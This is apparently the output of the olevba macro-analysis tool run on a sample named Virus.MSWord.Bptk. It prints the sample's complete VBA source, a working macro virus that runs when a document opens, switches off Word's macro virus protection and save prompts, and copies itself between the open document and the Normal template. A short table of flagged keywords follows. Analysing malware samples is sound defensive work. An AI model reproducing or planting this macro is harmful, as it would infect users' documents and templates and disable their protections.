olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bptk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bptk - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next 'D
Application.EnableCancelKey = Not -1
With Options:
.ConfirmConversions = 0
.SaveNormalPrompt = 0
.VirusProtection = 0
End With
d = "": c = d
If NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then
Set d = NormalTemplate.VBProject.VBComponents.Item(1)
Set c = ActiveDocument.VBProject.VBComponents.Item(1)
End If
If ActiveDocument.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then
Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set c = NormalTemplate.VBProject.VBComponents.Item(1)
End If
If d <> "" Then
d.Codemodule.DeleteLines 1, d.Codemodule.CountOfLines
For i = 1 To c.Codemodule.CountOfLines
 d.Codemodule.InsertLines i, c.Codemodule.Lines(i, 1)
Next i
ActiveDocument.Save
NormalTemplate.Save
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

